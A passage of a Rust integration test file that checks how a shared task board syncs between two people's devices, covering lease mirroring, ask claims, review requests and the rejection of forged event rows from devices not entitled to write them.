//! Shared boards stage 2 (v0.5 §5.3, §5.4, §9, §10): one board log held by
//! two made-up people, p1 on dev-a and p2 on dev-b, each with its own store
//! and coord. Rows move between them by vector, as the board sync does,
//! and both folds must agree.
#![allow(clippy::type_complexity)]

use crate::common;

use gocompat::time::GoTime;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use common::*;
use coord::roster::{AgentCard, Agents};
use coord::rows::TaskStateRow;
use coord::*;
use gocompat::json::RawJson;
use store::{Event, OpenOptions, Store, kinds};

const P1: &str = "person:p1";
const P2: &str = "person:p2";
const CARD1: &str = "agent:c1";
const CARD2: &str = "agent:c2";
/// p2's second agent.
const CARD3: &str = "agent:c3";

/// Who owned the board when: `(person, from hlc, until hlc)`.
type Owners = Arc<Mutex<Vec<(String, u64, u64)>>>;

struct Side {
    st: Arc<Store>,
    clk: Clk,
    c: Coord,
    // Last: fields drop in order, and Windows can't delete an open file.
    _dir: tempfile::TempDir,
}

fn key_person(k: &str) -> String {
    match k {
        P1 | CARD1 => "p1".into(),
        P2 | CARD2 | CARD3 => "p2".into(),
        _ => String::new(),
    }
}

fn device_person(d: &str) -> String {
    match d {
        "dev-a" | "dev-a2" => "p1".into(),
        "dev-b" | "dev-b2" => "p2".into(),
        _ => String::new(),
    }
}

/// side, with the person's done check (card #112) on or off.
fn side_with(dev: &str, person: &str, owners: &Owners, done_check: bool) -> Side {
    side_full(dev, person, owners, done_check, None)
}

/// side_with, with a roster of the agents live on this device.
fn side_full(
    dev: &str,
    person: &str,
    owners: &Owners,
    done_check: bool,
    ros: Option<Arc<TestRoster>>,
) -> Side {
    let clk = Clk(Arc::new(Mutex::new(fixed_now())));
    let c2 = clk.clone();
    let dir = tempfile::tempdir().unwrap();
    let hc = hlc::Clock::with_now(Box::new(move || c2.now().to_system()));
    let st = Arc::new(
        Store::open_with(
            dir.path().join("boards").join("b.db"),
            dev,
            Arc::new(hc),
            OpenOptions {
                board: true,
                ..OpenOptions::default()
            },
        )
        .unwrap(),
    );
    let o = side_opts(person, owners, done_check, &clk);
    let c = Coord::new(st.clone(), ros.map(|r| r as Arc<dyn Agents>), o).unwrap();
    Side {
        _dir: dir,
        st,
        clk,
        c,
    }
}

/// A new Coord over `s`'s store, as after a restart: it replays the log
/// in log order, not in the order the rows came.
fn replayed(s: &Side, person: &str, owners: &Owners) -> Coord {
    Coord::new(s.st.clone(), None, side_opts(person, owners, false, &s.clk)).unwrap()
}

fn side_opts(person: &str, owners: &Owners, done_check: bool, clk: &Clk) -> Options {
    let me = person.to_string();
    let o2 = owners.clone();
    Options {
        now: Some(clk.func()),
        board: true,
        done_check,
        person: person.into(),
        is_owner: Some(Arc::new(move |k: &str| k == me)),
        key_person: Some(Arc::new(key_person)),
        device_person: Some(Arc::new(device_person)),
        tag: Some(Arc::new(|| "mlg".to_string())),
        board_owner: Some(Arc::new(move |p: &str, at: Option<&RowPos>| {
            o2.lock().unwrap().iter().any(|(who, from, until)| {
                who == p && at.map_or(*until == u64::MAX, |at| *from < at.hlc && at.hlc < *until)
            })
        })),
        ..Options::default()
    }
}

fn raw(s: &str) -> RawJson {
    RawJson(s.as_bytes().to_vec())
}

/// p1 on dev-a and p2 on dev-b, with p1 the board's owner forever. dev-a
/// writes board.created and both people's agent cards travel to dev-b.
fn two_people() -> (Side, Side, Owners) {
    two_people_with(None, None)
}

/// two_people, with each device's roster of live agents.
fn two_people_with(
    ra: Option<Arc<TestRoster>>,
    rb: Option<Arc<TestRoster>>,
) -> (Side, Side, Owners) {
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let a = side_full("dev-a", P1, &owners, false, ra);
    let b = side_full("dev-b", P2, &owners, false, rb);
    a.st.append(
        P1,
        kinds::BOARD_CREATED,
        &raw(r#"{"boardId":"b","creator":{"personId":"p1"},"name":"mlg","tag":"mlg"}"#),
    )
    .unwrap();
    a.st.append(
        P1,
        kinds::BOARD_MEMBER_ADDED,
        &raw(r#"{"personId":"p2","role":"member"}"#),
    )
    .unwrap();
    a.st.append(
        CARD1,
        kinds::AGENT_CARD,
        &raw(r#"{"cardId":"c1","personId":"p1","status":"active"}"#),
    )
    .unwrap();
    pull(&a, &b);
    for c in ["c2", "c3"] {
        b.st.append(
            &format!("agent:{c}"),
            kinds::AGENT_CARD,
            &raw(&format!(
                r#"{{"cardId":"{c}","personId":"p2","status":"active"}}"#
            )),
        )
        .unwrap();
    }
    sync(&a, &b);
    (a, b, owners)
}

/// Moves what each side lacks from the other, both ways, and folds it.
fn sync(a: &Side, b: &Side) {
    pull(a, b);
    pull(b, a);
}

/// Moves what `to` lacks from `from` and folds it on `to`.
fn pull(from: &Side, to: &Side) {
    let rows = from.st.missing(&to.st.vector().unwrap(), 1000).unwrap();
    let (_, r) = to.st.insert_batch(&rows);
    r.unwrap();
    to.c.fold_live(&rows);
}

fn nt(title: &str, repo: &str) -> NewTask {
    NewTask {
        title: title.into(),
        repo_key: repo.into(),
        ..NewTask::default()
    }
}

fn hours(h: u64) -> GoTime {
    plus(fixed_now(), Duration::from_secs(3600 * h))
}

fn cancel_row(task: &str, dev: &str, seq: i64, at: GoTime, actor: &str) -> Event {
    let r = TaskStateRow {
        task_id: task.into(),
        state: CANCELED.into(),
        note: "not ours".into(),
        by: actor.into(),
        at,
        ..TaskStateRow::default()
    };
    Event {
        device_id: dev.into(),
        seq,
        hlc: hlc::Timestamp(hlc_at(at)),
        actor: actor.into(),
        kind: kinds::TASK_STATUS.into(),
        payload: gocompat::json::marshal(&r).unwrap(),
        sig: Vec::new(),
    }
}

// ---- the cancel rule at the row's time (§5.3) -------------------------------

#[test]
fn cancel_reads_the_owners_at_the_rows_time() {
    let (a, b, owners) = two_people();
    let one = a.c.create_task(P1, nt("one", "")).unwrap();
    let two = a.c.create_task(P1, nt("two", "")).unwrap();
    sync(&a, &b);
    // p2 owned the board from hour 1 to hour 3, and owns it no longer.
    owners
        .lock()
        .unwrap()
        .push(("p2".into(), hlc_at(hours(1)), hlc_at(hours(3))));
    // Written on p2's other device, so both stores take them by insert.
    let in_window = cancel_row(&one.id, "dev-b2", 1, hours(2), P2);
    let after = cancel_row(&two.id, "dev-b2", 2, hours(4), P2);
    for s in [&a, &b] {
        s.clk.add(Duration::from_secs(3600 * 5));
        let before = s.c.ignored_rows();
        for ev in [&in_window, &after] {
            s.st.insert(ev).unwrap();
            s.c.fold_live(std::slice::from_ref(ev));
        }
        assert_eq!(
            s.c.get_task(&one.id).unwrap().state,
            CANCELED,
            "a cancel by an owner at its time counts after they stop owning"
        );
        assert_ne!(
            s.c.get_task(&two.id).unwrap().state,
            CANCELED,
            "a cancel stamped after its writer stopped owning"
        );
        assert_eq!(s.c.ignored_rows(), before + 1);
    }
    // A withdraw now reads today's owners: p2 is none.
    let three = a.c.create_task(P1, nt("three", "")).unwrap();
    sync(&a, &b);
    let e = b.c.withdraw(P2, &three.id, "").unwrap_err();
    assert!(e.is(ErrorKind::NotAllowed), "{e}");
}

// ---- mirrored leases (§5.4) ------------------------------------------------

const SRC: &str = "path:remote:github.com/a/b:src/**";
const SRC_MAIN: &str = "path:remote:github.com/a/b:src/main.rs";

/// A shared card in REPO_A on p1's side that both people's agents work:
/// c1 claims it, c2 joins it.
fn shared_card(a: &Side, b: &Side) -> Task {
    let t =
        a.c.create_task(
            P1,
            NewTask {
                shared: true,
                ..nt("shared work", REPO_A)
            },
        )
        .unwrap();
    a.c.claim_task(CARD1, &t.id).unwrap();
    sync(a, b);
    b.c.join(CARD2, &t.id, CARD2).unwrap();
    sync(a, b);
    t
}

fn lease_on(s: &Side, resource: &str) -> Option<Lease> {
    s.c.leases().into_iter().find(|l| l.resource == resource)
}

#[test]
fn a_lease_mirrors_only_through_a_shared_card_in_its_repo() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let bare = a.c.create_task(P1, nt("no repo", "")).unwrap();
    a.c.claim_task(CARD1, &bare.id).unwrap();
    assert_eq!(a.c.mirror_tasks(CARD1, SRC, false), vec![t.id.clone()]);
    assert_eq!(b.c.mirror_tasks(CARD2, SRC, false), vec![t.id.clone()]);
    assert!(a.c.mirror_tasks(CARD1, "port:5173", false).is_empty());
    assert!(
        a.c.mirror_tasks(CARD1, "path:remote:github.com/x/y:src/**", false)
            .is_empty()
    );
    assert!(a.c.mirror_tasks("agent:c9", SRC, false).is_empty());
    assert_eq!(a.c.mirror_tasks("agent:c9", SRC, true), vec![t.id.clone()]);
    assert_eq!(
        a.c.mirror_acquire(CARD1, "port:5173", Duration::ZERO, false, false)
            .unwrap(),
        None,
        "a port lease isn't in any repo"
    );
    let l =
        a.c.mirror_acquire(CARD1, SRC, Duration::ZERO, false, false)
            .unwrap()
            .unwrap();
    assert_eq!(l.holder, CARD1);
    sync(&a, &b);
    assert_eq!(
        lease_on(&b, SRC).unwrap().holder,
        CARD1,
        "p2 sees p1's lease"
    );
    // It blocks p2's agent, and the refusal shows on both sides.
    let e =
        b.c.mirror_acquire(CARD2, SRC_MAIN, Duration::ZERO, false, false)
            .unwrap_err();
    assert!(e.is(ErrorKind::Held), "{e}");
    assert!(e.to_string().contains("release request"), "{e}");
    sync(&a, &b);
    for s in [&a, &b] {
        assert!(
            s.c.refusals()
                .iter()
                .any(|r| r.by == CARD2 && r.held_by == CARD1),
            "{:?}",
            s.c.refusals()
        );
    }
    // Its release mirrors too.
    assert!(a.c.mirror_release(CARD1, SRC).unwrap());
    assert!(!a.c.mirror_release(CARD1, SRC).unwrap(), "released twice");
    sync(&a, &b);
    assert!(lease_on(&b, SRC).is_none());
    // A card that ended mirrors nothing.
    a.c.set_task_state(CARD1, &t.id, COMPLETED, "done").unwrap();
    assert!(a.c.mirror_tasks(CARD1, SRC, false).is_empty());
}

#[test]
fn partitioned_lease_grabs_keep_the_lower_devices() {
    let (a, b, _) = two_people();
    shared_card(&a, &b);
    // Apart, both take overlapping leases.
    a.c.mirror_acquire(CARD1, SRC, Duration::ZERO, false, false)
        .unwrap()
        .unwrap();
    b.c.mirror_acquire(CARD2, SRC_MAIN, Duration::ZERO, false, false)
        .unwrap()
        .unwrap();
    // Not yet overlapping by name, so meet them on one resource too.
    a.c.mirror_acquire(CARD1, SRC_MAIN, Duration::ZERO, false, false)
        .unwrap()
        .unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let l = lease_on(s, SRC_MAIN).unwrap();
        assert_eq!(l.holder, CARD1, "dev-a < dev-b: p1's lease stands");
    }
    // p2's Core refuses its own losing lease and tells its agent.
    b.c.tick();
    sync(&a, &b);
    for s in [&a, &b] {
        assert!(
            s.c.refusals()
                .iter()
                .any(|r| r.by == CARD2 && r.held_by == CARD1 && r.conflict),
            "{:?}",
            s.c.refusals()
        );
    }
    a.c.tick();
    sync(&a, &b);
    assert!(
        !a.c.refusals().iter().any(|r| r.by == CARD1),
        "p1's Core refuses nothing of its winning lease"
    );
}

#[test]
fn nobody_steals_another_persons_lease() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    let l =
        a.c.mirror_acquire(CARD1, SRC, Duration::ZERO, false, false)
            .unwrap()
            .unwrap();
    sync(&a, &b);
    for e in [
        b.c.steal_lease(P2, SRC).unwrap_err(),
        b.c.acquire(CARD2, SRC_MAIN, Duration::ZERO, true)
            .unwrap_err(),
        b.c.release(P2, SRC).unwrap_err(),
    ] {
        assert!(e.is(ErrorKind::NotAllowed), "{e}");
        assert!(e.to_string().contains("release request"), "{e}");
    }
    // Forged rows from p2's devices: a steal and a release of p1's lease.
    let stolen = Event {
        device_id: "dev-b2".into(),
        seq: 1,
        hlc: hlc::Timestamp(hlc_at(plus(fixed_now(), mins(1)))),
        actor: P2.into(),
        kind: kinds::LEASE_STOLEN.into(),
        payload: gocompat::json::marshal(&coord::rows::LeaseStolenRow {
            resource: SRC.into(),
            holder: CARD1.into(),
            acquired_at: l.acquired_at,
            by: P2.into(),
            at: plus(fixed_now(), mins(1)),
        })
        .unwrap(),
        sig: Vec::new(),
    };
    let released = Event {
        device_id: "dev-b2".into(),
        seq: 2,
        hlc: hlc::Timestamp(hlc_at(plus(fixed_now(), mins(2)))),
        actor: CARD2.into(),
        kind: kinds::LEASE_RELEASED.into(),
        payload: gocompat::json::marshal(&coord::rows::LeaseReleasedRow {
            resource: SRC.into(),
            holder: CARD1.into(),
            reason: "released".into(),
            by: CARD2.into(),
            at: plus(fixed_now(), mins(2)),
        })
        .unwrap(),
        sig: Vec::new(),
    };
    for s in [&a, &b] {
        let before = s.c.ignored_rows();
        for ev in [&stolen, &released] {
            s.st.insert(ev).unwrap();
            s.c.fold_live(std::slice::from_ref(ev));
        }
        assert_eq!(
            lease_on(s, SRC).unwrap().holder,
            CARD1,
            "a forged row ended it"
        );
        assert_eq!(s.c.ignored_rows(), before + 2);
    }
    // p2 asks instead: a comment on the shared card, which p1's agent hears.
    let (cm, n) =
        b.c.request_release(P2, SRC, "I need src for the fix")
            .unwrap();
    assert_eq!(cm.task_id, t.id);
    assert!(cm.text.starts_with(RELEASE_REQUEST), "{}", cm.text);
    assert!(
        cm.text.contains(CARD1) && cm.text.contains(SRC),
        "{}",
        cm.text
    );
    assert!(n.to.contains(&CARD1.to_string()), "{n:?}");
    // Addressed to the holder, so the bridge carries it to that agent only.
    assert_eq!(cm.to, CARD1);
    sync(&a, &b);
    assert!(
        a.c.comments(&t.id)
            .unwrap()
            .iter()
            .any(|c| c.id == cm.id && c.to == CARD1),
        "the request reached p1's side"
    );
    let e = a.c.request_release(P1, SRC, "").unwrap_err();
    assert!(e.is(ErrorKind::Held), "one's own lease: {e}");
    // p1 steals its own agent's lease: that counts everywhere.
    a.c.steal_lease(P1, SRC).unwrap();
    sync(&a, &b);
    assert!(lease_on(&b, SRC).is_none());
}

// ---- asks on a board (§9) --------------------------------------------------

#[test]
fn a_board_ask_claimed_by_both_peoples_agents_has_one_winner() {
    let (a, b, _) = two_people();
    let (ask, _) =
        a.c.post_ask(
            P1,
            NewAsk {
                text: "Who can look at the flaky sync test?".into(),
                ..NewAsk::default()
            },
            &[],
        )
        .unwrap();
    assert_eq!(ask.ask.as_ref().unwrap().owner, "dev-a");
    sync(&a, &b);
    // Both people's agents ask to take it while apart; p2's asks first.
    let r2 = b.c.ask_claim(CARD2, &ask.id, Duration::ZERO).unwrap();
    assert!(r2.pending && !r2.mine, "{r2:?}");
    // p2's devices never decide the take, and a take row they forge counts
    // nowhere.
    b.c.tick();
    assert!(b.c.get_task(&ask.id).unwrap().ask.unwrap().taker.is_empty());
    sync(&a, &b);
    let r1 = a.c.ask_claim(CARD1, &ask.id, Duration::ZERO).unwrap();
    assert!(!r1.mine || r1.taker == CARD1, "{r1:?}");
    a.c.tick();
    sync(&a, &b);
    let taker = a.c.get_task(&ask.id).unwrap().ask.unwrap().taker;
    assert_eq!(taker, CARD2, "the first request the asking device folded");
    assert_eq!(b.c.get_task(&ask.id).unwrap().ask.unwrap().taker, taker);
    for s in [&a, &b] {
        let rows =
            s.st.list(&store::Filter {
                kinds: vec![kinds::BOARD_ASK_STATE.into()],
                ..store::Filter::default()
            })
            .unwrap();
        assert!(!rows.is_empty() && rows.iter().all(|r| r.device_id == "dev-a"));
        assert!(
            s.st.list(&store::Filter {
                kinds: vec!["take.".into()],
                ..store::Filter::default()
            })
            .unwrap()
            .is_empty(),
            "a private take row on the board"
        );
    }
    // The loser can't close it; the winner closes it as a card on the board.
    let e =
        a.c.ask_close(
            CARD1,
            &ask.id,
            AskOutcome {
                kind: OUTCOME_NONE.into(),
                note: "mine".into(),
                ..AskOutcome::default()
            },
        )
        .unwrap_err();
    assert!(!e.to_string().is_empty());
    b.c.ask_close(
        CARD2,
        &ask.id,
        AskOutcome {
            kind: OUTCOME_CARD.into(),
            title: "Fix the flaky sync test".into(),
            note: "a card for the fix".into(),
            ..AskOutcome::default()
        },
    )
    .unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let t = s.c.get_task(&ask.id).unwrap();
        assert_eq!(t.title, "Fix the flaky sync test", "{:?}", t.ask);
        assert!(t.ask.as_ref().unwrap().outcome.is_some());
        assert_eq!(
            t.short_ref(),
            ask.short_ref(),
            "the outcome card is the ask, on the board"
        );
    }
}

#[test]
fn a_take_lock_row_from_another_device_counts_nowhere() {
    let (a, b, _) = two_people();
    let (ask, _) =
        a.c.post_ask(
            P1,
            NewAsk {
                text: "Anyone?".into(),
                ..NewAsk::default()
            },
            &[],
        )
        .unwrap();
    sync(&a, &b);
    let forged = Event {
        device_id: "dev-b2".into(),
        seq: 1,
        hlc: hlc::Timestamp(hlc_at(plus(fixed_now(), mins(1)))),
        actor: "irori".into(),
        kind: kinds::BOARD_ASK_STATE.into(),
        payload: gocompat::json::marshal(&coord::rows::TakeStateRow {
            task_id: ask.id.clone(),
            taker: CARD2.into(),
            reason: TAKE_TAKEN.into(),
            at: plus(fixed_now(), mins(1)),
            ..coord::rows::TakeStateRow::default()
        })
        .unwrap(),
        sig: Vec::new(),
    };
    for s in [&a, &b] {
        let before = s.c.ignored_rows();
        s.st.insert(&forged).unwrap();
        s.c.fold_live(std::slice::from_ref(&forged));
        assert!(s.c.get_task(&ask.id).unwrap().ask.unwrap().taker.is_empty());
        assert_eq!(s.c.ignored_rows(), before + 1);
    }
    // A take row naming a card that isn't on the board is refused outright.
    let e =
        b.st.append(
            "irori",
            kinds::BOARD_ASK_STATE,
            &raw(r#"{"taskId":"01NOTONTHISBOARD0000000000","taker":"agent:c2"}"#),
        )
        .unwrap_err();
    assert!(e.to_string().contains("not a card on this board"), "{e}");
}

// ---- peer review requests (§10) --------------------------------------------

const PR: &str = "https://github.com/a/b/pull/7";

#[test]
fn a_review_request_reaches_the_other_persons_reviewer() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    a.c.add_link(CARD1, &t.id, PR).unwrap();
    sync(&a, &b);
    // Nobody dedicated yet, and one's own person's agents can't approve.
    let e = a.c.request_review(CARD1, &t.id, PR, "").unwrap_err();
    assert!(e.is(ErrorKind::NotFound), "{e}");
    let e = a.c.request_review(CARD1, &t.id, PR, CARD1).unwrap_err();
    assert!(e.is(ErrorKind::NotAllowed), "{e}");
    // Card #471: an agent no member owns is nobody else's either.
    let e =
        a.c.request_review(CARD1, &t.id, PR, "agent:nobody")
            .unwrap_err();
    assert!(e.is(ErrorKind::NotAllowed), "an unknown agent: {e}");
    let e =
        a.c.request_review(CARD1, &t.id, "https://github.com/a/b/pull/8", CARD2)
            .unwrap_err();
    assert!(e.is(ErrorKind::Invalid), "an unlinked PR: {e}");
    let e = a.c.request_review(P1, &t.id, PR, CARD2).unwrap_err();
    assert!(e.is(ErrorKind::Invalid), "a person asks no review: {e}");
    // p2 dedicates c2, for the card's repo only; only p2 may.
    for (by, who) in [(CARD2, CARD2), (P2, CARD1)] {
        let e = b.c.set_reviewer(by, who, REPO_A).unwrap_err();
        assert!(e.is(ErrorKind::NotAllowed), "{by} {who}: {e}");
    }
    b.c.set_reviewer(P2, CARD2, REPO_A).unwrap();
    sync(&a, &b);
    assert_eq!(a.c.reviewer("p2", REPO_A), CARD2);
    assert_eq!(a.c.reviewer("p2", REPO_B), "", "another repo has none");
    // Without to, the row names the dedicated reviewer (never to:"",
    // which the bridge can't deliver).
    let (r, n) = a.c.request_review(CARD1, &t.id, PR, "").unwrap();
    assert_eq!(r.len(), 1);
    assert_eq!((r[0].from.as_str(), r[0].to.as_str()), (CARD1, CARD2));
    assert_eq!(n.kind, NOTICE_REVIEW);
    assert_eq!(n.to, vec![CARD2.to_string()]);
    assert!(n.text.contains(PR), "{}", n.text);
    sync(&a, &b);
    assert_eq!(b.c.reviews(&t.id), r);
    // Forged: p2's device asking as p1's agent, p1's device dedicating
    // p2's agent.
    let at = plus(fixed_now(), mins(5));
    let forged = [
        Event {
            device_id: "dev-b2".into(),
            seq: 1,
            hlc: hlc::Timestamp(hlc_at(at)),
            actor: CARD1.into(),
            kind: kinds::REVIEW_REQUESTED.into(),
            payload: gocompat::json::marshal(&coord::rows::ReviewRequestedRow {
                task_id: t.id.clone(),
                pr: PR.into(),
                from: CARD1.into(),
                to: CARD2.into(),
                at,
                wake: true,
                look: false,
            })
            .unwrap(),
            sig: Vec::new(),
        },
        Event {
            device_id: "dev-a2".into(),
            seq: 1,
            hlc: hlc::Timestamp(hlc_at(at)),
            actor: P1.into(),
            kind: kinds::REVIEW_REVIEWER.into(),
            payload: gocompat::json::marshal(&coord::rows::ReviewReviewerRow {
                reviewer: CARD2.into(),
                repo_key: String::new(),
                by: P1.into(),
                at,
            })
            .unwrap(),
            sig: Vec::new(),
        },
    ];
    for s in [&a, &b] {
        let before = s.c.ignored_rows();
        for ev in &forged {
            s.st.insert(ev).unwrap();
            s.c.fold_live(std::slice::from_ref(ev));
        }
        assert_eq!(s.c.ignored_rows(), before + 2);
        let aside = s.c.set_aside();
        assert_eq!(aside.ignored, s.c.ignored_rows());
        assert_eq!(aside.ignored_by.get("dev-b2"), Some(&1), "{aside:?}");
        assert_eq!(aside.ignored_by.get("dev-a2"), Some(&1), "{aside:?}");
        assert_eq!(s.c.reviews(&t.id).len(), 1);
        assert_eq!(s.c.reviewer("p1", ""), "");
    }
    // Asked by name, the request goes to that agent alone.
    let (_, n) = b.c.request_review(CARD2, &t.id, PR, CARD1).unwrap();
    assert_eq!(n.to, vec![CARD1.to_string()]);
}

#[test]
fn a_steal_on_the_board_takes_only_ones_own_persons_lease() {
    let (a, b, _) = two_people();
    let t = shared_card(&a, &b);
    a.c.mirror_acquire(CARD1, SRC, Duration::ZERO, false, false)
        .unwrap()
        .unwrap();
    sync(&a, &b);
    let e =
        b.c.mirror_acquire(CARD2, SRC_MAIN, Duration::ZERO, false, true)
            .unwrap_err();
    assert!(e.is(ErrorKind::NotAllowed), "another person's: {e}");
    assert_eq!(lease_on(&a, SRC).unwrap().holder, CARD1);
    // p1 releases, p2's c2 takes it, and p2's own c3 steals from it.
    assert!(a.c.mirror_release(CARD1, SRC).unwrap());
    sync(&a, &b);
    b.c.mirror_acquire(CARD2, SRC, Duration::ZERO, false, false)
        .unwrap()
        .unwrap();
    b.c.join(CARD3, &t.id, CARD3).unwrap();
    let l =
        b.c.mirror_acquire(CARD3, SRC_MAIN, Duration::ZERO, false, true)
            .unwrap()
            .unwrap();
    assert_eq!(l.stolen_from, CARD2, "one's own person's lease");
    sync(&a, &b);
    for s in [&a, &b] {
        assert!(lease_on(s, SRC).is_none(), "the stolen lease ended");
        assert_eq!(lease_on(s, SRC_MAIN).unwrap().holder, CARD3);
    }
}

/// #61: "irori" names no person, so a board counts its task.created for
/// nothing. Creating a card as Irori on a board is refused, not a panic,
/// and writes nothing; a person's card still goes through after it.
#[test]
fn irori_creating_a_board_card_is_refused() {
    let (a, b, _) = two_people();
    let before = a.c.list_tasks(&TaskFilter::default()).len();
    let err = a.c.create_task("irori", nt("by irori", "")).unwrap_err();
    assert!(err.to_string().contains("Irori itself"), "{err}");
    sync(&a, &b);
    assert_eq!(a.c.list_tasks(&TaskFilter::default()).len(), before);
    assert_eq!(b.c.list_tasks(&TaskFilter::default()).len(), before);
    a.c.create_task(P1, nt("by a person", "")).unwrap();
}

/// Card #112 on a shared board: an agent's completed waits on its
/// person's Done, and that Done (resolve, then completed) closes the card.
#[test]
fn a_done_check_closes_on_a_shared_board() {
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let a = side_with("dev-a", P1, &owners, true);
    a.st.append(
        P1,
        kinds::BOARD_CREATED,
        &raw(r#"{"boardId":"b","creator":{"personId":"p1"},"name":"mlg","tag":"mlg"}"#),
    )
    .unwrap();
    a.st.append(
        CARD1,
        kinds::AGENT_CARD,
        &raw(r#"{"cardId":"c1","personId":"p1","status":"active"}"#),
    )
    .unwrap();
    let a = side_reopen(a, P1, &owners);
    let t = a.c.create_task(P1, nt("ship", "")).unwrap();
    a.c.claim_task(CARD1, &t.id).unwrap();
    let got =
        a.c.set_task_state(CARD1, &t.id, COMPLETED, "shipped")
            .unwrap();
    assert_eq!(got.state, BLOCKED);
    let b = got
        .blockers
        .iter()
        .find(|b| b.open() && b.done_check)
        .expect("a done check");
    let bid = b.id.clone();
    a.c.answer(
        P1,
        &t.id,
        &bid,
        BlockerAnswer {
            pick: 1,
            resolve: true,
            ..BlockerAnswer::default()
        },
    )
    .unwrap();
    let closed = a.c.set_task_state(P1, &t.id, COMPLETED, "").unwrap();
    assert_eq!(closed.state, COMPLETED);
}

/// A new coord over side s's store with the done check on.
fn side_reopen(s: Side, person: &str, owners: &Owners) -> Side {
    side_reopen_with(s, person, owners, Options::default())
}

/// side_reopen, taking anything else from `more` (its spawning switch).
fn side_reopen_with(s: Side, person: &str, owners: &Owners, more: Options) -> Side {
    let me = person.to_string();
    let o2 = owners.clone();
    let o = Options {
        now: Some(s.clk.func()),
        board: true,
        done_check: true,
        person: person.into(),
        is_owner: Some(Arc::new(move |k: &str| k == me)),
        key_person: Some(Arc::new(key_person)),
        device_person: Some(Arc::new(device_person)),
        tag: Some(Arc::new(|| "mlg".to_string())),
        board_owner: Some(Arc::new(move |p: &str, at: Option<&RowPos>| {
            o2.lock().unwrap().iter().any(|(who, from, until)| {
                who == p && at.map_or(*until == u64::MAX, |at| *from < at.hlc && at.hlc < *until)
            })
        })),
        ..more
    };
    let c = Coord::new(s.st.clone(), None, o).unwrap();
    Side { c, ..s }
}

/// The board's roster as each side sees it: c1 is p1's, c2 and c3 are
/// p2's. `idle` are idle (the earlier in the list idle longest); the rest
/// are busy.
fn roster(idle: &[&str]) -> Vec<coord::roster::AgentCard> {
    [CARD1, CARD2, CARD3]
        .iter()
        .map(|k| coord::roster::AgentCard {
            key: (*k).into(),
            status: if idle.contains(k) { "idle" } else { "busy" }.into(),
            updated_at: hours(idle.iter().position(|i| i == k).unwrap_or(9) as u64),
            ..Default::default()
        })
        .collect()
}

/// p1 on dev-a and p2 on dev-b on one shared board.
fn two_people_shared() -> (Side, Side) {
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let a = side_with("dev-a", P1, &owners, false);
    let b = side_with("dev-b", P2, &owners, false);
    a.st.append(
        P1,
        kinds::BOARD_CREATED,
        &raw(r#"{"boardId":"b","creator":{"personId":"p1"},"name":"mlg","tag":"mlg"}"#),
    )
    .unwrap();
    a.st.append(
        P1,
        kinds::BOARD_MEMBER_ADDED,
        &raw(r#"{"personId":"p2","role":"member"}"#),
    )
    .unwrap();
    a.st.append(
        CARD1,
        kinds::AGENT_CARD,
        &raw(r#"{"cardId":"c1","personId":"p1","status":"active"}"#),
    )
    .unwrap();
    pull(&a, &b);
    for c in ["c2", "c3"] {
        b.st.append(
            &format!("agent:{c}"),
            kinds::AGENT_CARD,
            &raw(&format!(
                r#"{{"cardId":"{c}","personId":"p2","status":"active"}}"#
            )),
        )
        .unwrap();
    }
    sync(&a, &b);
    (a, b)
}

/// Card #174, the author's agents (the default): p1's open card goes only
/// to p1's free agent, and only p1's device hands it out.
#[test]
fn open_cards_go_to_the_authors_agents() {
    let (a, b) = two_people_shared();
    let t = a.c.create_task(P1, nt("Fix the loader", "")).unwrap();
    sync(&a, &b);
    // p2's device runs no hand-out for p1's card.
    let (ns, r) = b.c.sweep_asks_partial(&roster(&[CARD2, CARD3, CARD1]));
    r.unwrap();
    assert!(ns.is_empty(), "{ns:?}");
    // p1's agent is busy: p2's free agents don't get it; it waits.
    let (ns, r) = a.c.sweep_asks_partial(&roster(&[CARD2, CARD3]));
    r.unwrap();
    assert!(ns.is_empty(), "{ns:?}");
    // p1's agent goes idle: it gets it.
    let (ns, r) = a.c.sweep_asks_partial(&roster(&[CARD2, CARD1]));
    r.unwrap();
    assert!(ns.len() == 1 && ns[0].to == [CARD1], "{ns:?}");
    sync(&a, &b);
    for s in [&a, &b] {
        let o = s.c.get_task(&t.id).unwrap().live_offer().cloned().unwrap();
        assert_eq!(o.to, CARD1);
    }
}

/// Card #174: a hand-out row only counts from the device that made the
/// card, so another device can't point it at its own agent.
#[test]
fn a_hand_out_from_another_device_counts_nowhere() {
    let (a, b) = two_people_shared();
    let t = a.c.create_task(P1, nt("Fix the loader", "")).unwrap();
    sync(&a, &b);
    // From Irori and from one of p2's agents, on p2's device.
    for actor in ["irori", CARD3] {
        let ev =
            b.st.append(
                actor,
                kinds::TASK_OFFERED,
                &raw(&format!(
                    r#"{{"taskId":"{}","to":"{CARD3}","reason":"handed","heard":["{CARD3}"]}}"#,
                    t.id
                )),
            )
            .unwrap();
        b.c.fold_live(&[ev]);
    }
    sync(&a, &b);
    for s in [&a, &b] {
        assert!(s.c.get_task(&t.id).unwrap().live_offer().is_none());
    }
}

fn idle(key: &str, dev: &str) -> coord::roster::AgentCard {
    coord::roster::AgentCard {
        key: key.into(),
        device_id: dev.into(),
        status: "idle".into(),
        ..Default::default()
    }
}

/// A thread on a shared board (card #134): the agents on the board's card
/// it names hear it, woken; another member's comment is a person's, not an
/// answer; nobody waits on the named agents (card #512), so at once one
/// idle agent of any member gets it, or it is unclaimed; the
/// person's follow-up goes to the agent that answered, on both sides; only
/// the member who started it resolves it.
#[test]
fn a_board_thread_among_two_people() {
    let (a, b, _) = two_people();
    let card = shared_card(&a, &b);
    let (tk, n) =
        a.c.post_ask(
            P1,
            NewAsk {
                text: format!("Is #{} still moving?", card.short),
                thread: true,
                ..NewAsk::default()
            },
            &[],
        )
        .unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let ask = s.c.get_task(&tk.id).unwrap().ask.unwrap();
        assert!(ask.thread && ask.taker.is_empty(), "{ask:?}");
        assert_eq!(ask.heard, [CARD1, CARD2], "both holders of the named card");
    }
    assert!(
